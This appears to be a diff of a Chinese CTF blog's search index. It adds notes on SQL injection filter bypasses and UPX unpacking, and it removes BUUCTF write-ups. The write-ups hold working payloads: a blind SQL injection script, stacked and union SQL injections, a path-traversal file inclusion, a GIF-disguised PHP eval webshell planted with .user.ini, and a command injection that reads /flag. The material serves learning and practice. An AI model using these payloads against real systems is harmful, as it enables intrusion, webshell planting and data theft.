%(j,i)</span><br><span class="line">			<span class="comment"># print(url+'%23')</span></span><br><span class="line">			r = requests.get(url+<span class="string">'%23'</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				name = name+i</span><br><span class="line">				</span><br><span class="line">				print(name)</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	print(<span class="string">'database_name:'</span>,name)</span><br><span class="line">	</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line">database_name()</span><br></pre></td></tr></table></figure>
+<h1 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h1><h2 id="注释符号绕过"><a href="#注释符号绕过" class="headerlink" title="注释符号绕过"></a>注释符号绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- 注释内容</span><br><span class="line"># 注释内容</span><br><span class="line">&#x2F;*注释内容*&#x2F;</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>
+
+<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><blockquote>
+<p>某些关键字可能被过滤，利用sql语句对大小写不敏感的特点，可以任意变换关键字大小写来绕过过滤；</p>
+</blockquote>
+<h2 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h2><blockquote>
+<p>内联注释就是把一些特有的仅在MYSQL上的语句放在<code>/*...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
+</blockquote>
+<h2 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h2><blockquote>
+<p>在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求</p>
+</blockquote>
+<h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**&#x2F;</span><br><span class="line">()</span><br><span class="line">\n(%0a)</span><br><span class="line">&#96;(grave)</span><br><span class="line">tab(%09)</span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and &#x3D; &amp;&amp;</span><br><span class="line">or &#x3D; ||</span><br><span class="line">xor &#x3D; ^</span><br><span class="line">not &#x3D; !</span><br></pre></td></tr></table></figure>
+<h2 id="过滤等号-绕过"><a href="#过滤等号-绕过" class="headerlink" title="过滤等号=绕过"></a>过滤等号=绕过</h2><blockquote>
+<p>1.不加通配符的like执行的效果和=一致，所以可以用来绕过<br>2.rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来<br>用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样<br>3.regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配<br>4.使用大小于号来绕过<br>5.&lt;&gt; 等价于 !=，所以在前面再加一个!结果就是等号了<br>6.等号绕过也可以使用strcmp(str1,str2)函数、between关键字等</p>
+</blockquote>
+<h2 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h2><p><code>from pos for len</code></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="string">"string"</span>,<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="string">"string"</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">3</span>);</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)c</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h2><blockquote>
+<p>sleep() –&gt;benchmark()<br>ascii()–&gt;hex()、bin()<br>group_concat()–&gt;concat_ws()<br>substr(),substring(),mid()<br>user() –&gt; @@user、datadir–&gt;@@datadir<br>ord()–&gt;ascii()</p>
+</blockquote>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313" target="_blank" rel="noopener">https://blog.csdn.net/huanghelouzi/article/details/82995313</a><br><a href="https://blog.csdn.net/weixin_40709439/article/details/81355856" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40709439/article/details/81355856</a><br><a href="https://www.dazhuanlan.com/2019/12/09/5dee2bf66bd36/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/12/09/5dee2bf66bd36/</a><br><a href="https://xz.aliyun.com/t/7169" target="_blank" rel="noopener">https://xz.aliyun.com/t/7169</a></p>
+]]></content>
+      <categories>
+        <category>note</category>
+      </categories>
+      <tags>
+        <tag>CTF - Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>UPX壳详解</title>
+    <url>/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<hr>
+<a id="more"></a>
+
+<h1 id="UPX简介"><a href="#UPX简介" class="headerlink" title="UPX简介"></a>UPX简介</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPX (the Ultimate Packer for eXecutables)是一个著名的压缩壳,主要功能是压缩PE文件(比如exe,dll等文件),有时候也可能被病毒用于免杀。壳upx是一种保护程 序。一般是EXE文件的一种外保护措施，主要用途：</span><br><span class="line"></span><br><span class="line">1、让正规文件被保护起来，不容易被修改和破解。</span><br><span class="line"></span><br><span class="line">2、使文件压缩变小。</span><br><span class="line"></span><br><span class="line">3、保护杀毒软件安装程序，使之不受病毒侵害。</span><br><span class="line"></span><br><span class="line">4、木马，病毒的保护外壳，使之难以为攻破。</span><br><span class="line"></span><br><span class="line">利用特殊的算法，对EXE、DLL文件里的资源进行压缩。类似WINZIP 的效果，只不过这个压缩之后的文件，可以独立运行，解压过程完全隐蔽，都在内存中完成。解压原理，是加壳工具在文件头里加了一段指令，告诉CPU，怎么才 能解压自己。当加壳时，其实就是给可执行的文件加上个外衣。用户执行的只是这个外壳程序。当执行这个程序的时候这个壳就会把原来的程序在内存中解开，解开 后，以后的就交给真正的程序。</span><br></pre></td></tr></table></figure>
+
+<h1 id="脱壳工具"><a href="#脱壳工具" class="headerlink" title="脱壳工具"></a>脱壳工具</h1><p>upx壳的官网是：<a href="https://upx.github.io/" target="_blank" rel="noopener">https://upx.github.io/</a><br>下载最新版的upx：<a href="https://github.com/upx/upx/releases/" target="_blank" rel="noopener">https://github.com/upx/upx/releases/</a> </p>
+<h1 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h1><p><strong>（“堆栈平衡”原理）</strong></p>
+<blockquote>
+<p>call指令：<br>  1.向堆栈中压入下一行程序的地址；<br>  2.JMP到call的子程序地址处。</p>
+</blockquote>
+<blockquote>
+<p>RETN指令：<br>  1.将当前的ESP中指向的地址出栈；<br>  2.JMP到这个地址。这个就完成了一次调用子程序的过程</p>
+</blockquote>
+<blockquote>
+<p>如果我们要返回父程序，则当我们在堆栈中进行堆栈的操作的时候，一定要保证在RETN这条指令之前，ESP指向的是我们压入栈中的地址。</p>
+</blockquote>
+<blockquote>
+<p>在程序自解密或者自解压过程中, 多数壳会先将当前寄存器状态压栈, 如使用pushad, 而在解压结束后, 会将之前的寄存器值出栈, 如使用popad. 因此在寄存器出栈时, 往往程序代码被恢复, 此时硬件断点触发（这就是我们要下硬件断点的原因），然后在程序当前位置, 只需要一些单步操作, 就会到达正确的OEP位置</p>
+</blockquote>
+<p><strong>载入程序后只有esp寄存器内容发生变化，那么这个程序多半可以用ESP定律(存疑)</strong></p>
+<h1 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h1><h2 id="脱壳三步法"><a href="#脱壳三步法" class="headerlink" title="脱壳三步法"></a>脱壳三步法</h2><blockquote>
+<p>① 寻找原始OEP<br>这一步骤的主要作用就是要确定原始程序代码到底在哪里，能找到原始程序的代码，说明壳代码执行完了，我们只有找到原始OEP才能进行下一步的动作。</p>
+<p>② dump内存到文件<br>当我们找到原始OEP，调试运行到原始OEP时，只要代码被还原，我们就可以在这个地方进行dump内存，将内存中被还原的代码和数据抓取下来，重新保存成一个文件，这样脱完壳时，我们就可以用静态分析工具分析程序了。</p>
+<p>③ 修复文件<br>这一步主要就是修复IAT，对从内存中转储到本地的文件进行修复。</p>
+</blockquote>
+<h2 id="示例：BUUCTF-Reverse-新年快乐"><a href="#示例：BUUCTF-Reverse-新年快乐" class="headerlink" title="示例：BUUCTF_Reverse_新年快乐"></a>示例：BUUCTF_Reverse_新年快乐</h2><p><img src="/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803160918611.png" alt="image-20200803160918611"></p>
+<p>使用ExeinfoPE查壳，确认是UPX</p>
+<p>x32dbg打开，寻找原始OEP</p>
+<p><img src="/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803161135150.png" alt="image-20200803161135150"></p>
+<p>不需要下ESP硬件断点，F9运行，可以看到popad在上方</p>
+<p><img src="/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803161244521.png" alt="image-20200803161244521"></p>
+<p>有一系列jmp指令，选择跳转较远的，地址00401280，一般就是原始OEP，可以下一个断电F9运行，确认是原始OEP</p>
+<p>使用Scylla插件，Dump，自动寻找IAT，获取导入表，修复Dump文件</p>
+<p>IDA打开脱壳文件，确认成功</p>
+<p>注：原始OEP也可以通过逐条分析汇编指令寻找，难度较大；有经验的话可以直接搜索popad</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=314918" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=314918</a></p>
+<p><a href="https://www.anquanke.com/post/id/99750" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99750</a></p>
+<p><a href="https://blog.csdn.net/qq_42967398/article/details/96444954" target="_blank" rel="noopener">https://blog.csdn.net/qq_42967398/article/details/96444954</a></p>
+<p><a href="https://baijiahao.baidu.com/s?id=1662196196423030806&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1662196196423030806&amp;wfr=spider&amp;for=pc</a></p>
+]]></content>
+      <categories>
+        <category>note</category>
+      </categories>
+      <tags>
+        <tag>Reverse</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ciscn2020-初赛-reverse-writeup</title>
     <url>/2020/09/01/ciscn2020-%E5%88%9D%E8%B5%9B-reverse-writeup/</url>
     <content><![CDATA[<hr>
@@ -426,254 +426,6 @@
       </categories>
       <tags>
         <tag>CTF - Re</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week20200713-20200719</title>
-    <url>/2020/07/23/week20200713-20200719/</url>
-    <content><![CDATA[<h1 id="Week-1-lt-2020-07-13-2020-07-19-gt"><a href="#Week-1-lt-2020-07-13-2020-07-19-gt" class="headerlink" title="Week 1 &lt;2020.07.13 - 2020.07.19&gt;"></a>Week 1 &lt;2020.07.13 - 2020.07.19&gt;</h1><a id="more"></a>
-
-
-<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>打开实例，只有一张图片，右键查看网页代码：</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>&lt;!DOCTYPE html&gt;</th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td>&lt;html lang=”en”&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;head&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;meta charset=”UTF-8”&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;meta name=”viewport” content=”width=device-width, initial-scale=1.0”&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;meta http-equiv=”X-UA-Compatible” content=”ie=edge”&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;title&gt;Document&lt;/title&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;/head&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;body&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;!–source.php–&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;br&gt;&lt;img src=”<a href="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg" target="_blank" rel="noopener">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</a>“ /&gt;&lt;/body&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td>&lt;/html&gt;</td>
-</tr>
-</tbody></table>
-<p>可以获得source.php代码：<br>payload: <a href="http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php" target="_blank" rel="noopener">http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php</a></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        </span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];  <span class="comment">// $whitelist</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;  <span class="comment">// $page is string</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;  <span class="comment">// $page in whitelist</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(  <span class="comment">// 截取"?"前的字符串</span></span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;  <span class="comment">// $page in whitelist</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(  <span class="comment">// 截取"?"前的字符串</span></span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;  <span class="comment">// $page in whitelist</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;amp;&amp;amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;amp;&amp;amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=&amp;#92;"</span>https:<span class="comment">//i.loli.net/2018/11/01/5bdb0d93dc794.jpg&amp;#92;" /&gt;";</span></span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>通过 checkFile()  校验则可以包含flag所在文件<br>先访问$whitelist 中的hint.php<br><a href="http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=hint.php" target="_blank" rel="noopener">http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=hint.php</a><br>获得文件名 <img src="http://localhost:9002/file/image/5f17017f657e1fa600390ac1" alt><br>构造payload：<br><a href="http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg" target="_blank" rel="noopener">http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg</a></p>
-<p>flag ： flag{82c0aedf-43e8-4745-9f2c-38444a3c2f30}</p>
-<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p><strong>方法一：堆叠注入，重命名</strong></p>
-<p>SQL语句 ： </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; show databases#</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/23/week20200713-20200719/image-20200726161826216.png" alt="image-20200726161826216"><br>SQL语句 ： </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; show tables#</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/23/week20200713-20200719/image-20200726161841013.png" alt="image-20200726161841013"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/23/week20200713-20200719/image-20200726161859923.png" alt="image-20200726161859923"><br>此处发现了flag字段，以下重点：<br>重命名：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39;;</span><br><span class="line">rename table words to words1;</span><br><span class="line">rename table &#96;1919810931114514&#96; to words;</span><br><span class="line">alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span><br><span class="line">desc  words;#</span><br></pre></td></tr></table></figure>
-<p>再操作取得flag：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
-<p>flag： flag{6804a2d0-bcbf-4f1c-8785-d1f241519712}</p>
-<p><strong>方法二：预处理</strong></p>
-<p>字符串转十六进制：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &#96;1919810931114514&#96;</span><br></pre></td></tr></table></figure>
-<p>=&gt; 0x73656c65637420202a2066726f6d20603139313938313039333131313435313460</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">SeT @s2h &#x3D; 0x73656c65637420202a2066726f6d20603139313938313039333131313435313460;</span><br><span class="line">prepare ss from @s2h;</span><br><span class="line">execute ss;</span><br></pre></td></tr></table></figure>
-<p>(SeT 绕过过滤函数）<br>成功获得flag</p>
-<p><strong>方法三：handler查询</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">handler &#96;1919810931114514&#96; open;</span><br><span class="line">handler &#96;1919810931114514&#96; read first;#</span><br></pre></td></tr></table></figure>
-
-<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>原理：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select $_GET[&#39;query&#39;] || flag from flag</span><br></pre></td></tr></table></figure>
-<p>非预期解：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*,1</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure>
-<p>预期解：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;</span><br><span class="line">set sql_mode&#x3D;PIPES_AS_CONCAT;</span><br><span class="line">select 1</span><br></pre></td></tr></table></figure>
-<p>解释：mysql缺省不支持oracle将 || 解释为字符串拼接，第二行启用了兼容设置</p>
-<p>flag{13a1a49a-d096-4a5b-aac0-ef90df2f1b2c}</p>
-<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>随便试一下就过了。。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
-<p>URL:<a href="http://0f6b6f42-6865-4b45-83d5-e32a7f3ab954.node3.buuoj.cn/check.php?username=admin%27or%271%27=%271&amp;password=admin%27or%271%27=%271" target="_blank" rel="noopener">http://0f6b6f42-6865-4b45-83d5-e32a7f3ab954.node3.buuoj.cn/check.php?username=admin%27or%271%27=%271&amp;password=admin%27or%271%27=%271</a></p>
-<p>flag{d1d4ffc6-0e42-4ae0-b177-985390fbf756}</p>
-]]></content>
-      <categories>
-        <category>BUUCTF</category>
-      </categories>
-      <tags>
-        <tag>CTF - Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week20200727-20200802</title>
-    <url>/2020/07/28/week20200727-20200802/</url>
-    <content><![CDATA[<h1 id="Week-3-lt-2020-07-27-2020-08-02-gt"><a href="#Week-3-lt-2020-07-27-2020-08-02-gt" class="headerlink" title="Week 3 &lt;2020.07.27 - 2020.08.02&gt;"></a>Week 3 &lt;2020.07.27 - 2020.08.02&gt;</h1><a id="more"></a>
-
-<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>题目和网页都给出了提示，考察文件包含</p>
-<p>同 Secret File 的解法，使用”php://filter”伪协议进行包含</p>
-<p>payload：/?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<p>获得base64码，解密得到flag</p>
-<p>flag{f876c961-c87b-4060-a5b5-299aae870ace}</p>
-<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>用AntSword连接，密码网页给出了是”Syc”</p>
-<p><img src="/2020/07/28/week20200727-20200802/image-20200729003126637.png" alt="image-20200729003126637"></p>
-<p>连接，在根目录找到flag文件</p>
-<p>flag{41d79b55-d82a-4490-9bb4-31f8308a676a}</p>
-<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>—— 转自<a href="https://www.cnblogs.com/20175211lyz/p/11455355.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11455355.html</a> ——</p>
-<blockquote>
-<p><strong>.user.ini 文件</strong><br>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件<em>仅</em>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。<br>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（[$_SERVER[‘DOCUMENT_ROOT’]]所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。<br>在 .user.ini 风格的 INI 文件中只有具有 <strong><code>PHP_INI_PERDIR</code></strong> 和 <strong><code>PHP_INI_USER</code></strong> 模式的 INI 设置可被识别。<br>两个新的 INI 指令，<em>user_ini.filename</em> 和 <em>user_ini.cache_ttl</em> 控制着用户 INI 文件的使用。<br><em>user_ini.filename</em> 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 <em>.user.ini*。<br>*user_ini.cache_ttl</em> 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>
-</blockquote>
-<blockquote>
-<p><strong>绕过exif_imagetype()方法</strong><br>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。<br>在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br>XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。<br>也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：</p>
-</blockquote>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_width 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test_height 7</span></span><br></pre></td></tr></table></figure>
-
-<p>知识点：<br>1.利用.user.ini上传/隐藏后门<br>2.绕过exif_imagetype()</p>
-<p>———————————————————————————————</p>
-<p>通过上传<code>.user.ini</code>文件来给同目录下的<code>index.php</code>文件添加上一些额外的内容</p>
-<blockquote>
-<p>GIF89a：图片格式gif必要文件头信息</p>
-</blockquote>
-<p>依次上传：<br><strong>a.jpg</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<p><strong>.user.ini</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line">auto_prepend_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure>
-<p>蚁剑连接<br><a href="http://4d647826-57bc-45db-9d04-4220e9fc4cdd.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php" target="_blank" rel="noopener">http://4d647826-57bc-45db-9d04-4220e9fc4cdd.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php</a><br>读取flag</p>
-<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>没有过滤，管道符直接取flag</p>
-<p>payload: 127.0.0.1 | cat /flag</p>
-<p>flag{de9ab224-511d-4a33-9e1d-5c871c9518b1}</p>
-<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>知识点：双写绕过</p>
-<p>数据库 payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%20%23</span><br></pre></td></tr></table></figure>
-
-<p>数据表 payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br></pre></td></tr></table></figure>
-<p>目标在 ‘b4bsql’</p>
-<p>列 payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23</span><br></pre></td></tr></table></figure>
-<p>列名’id,username,password’</p>
-<p>字段 payload:</p>
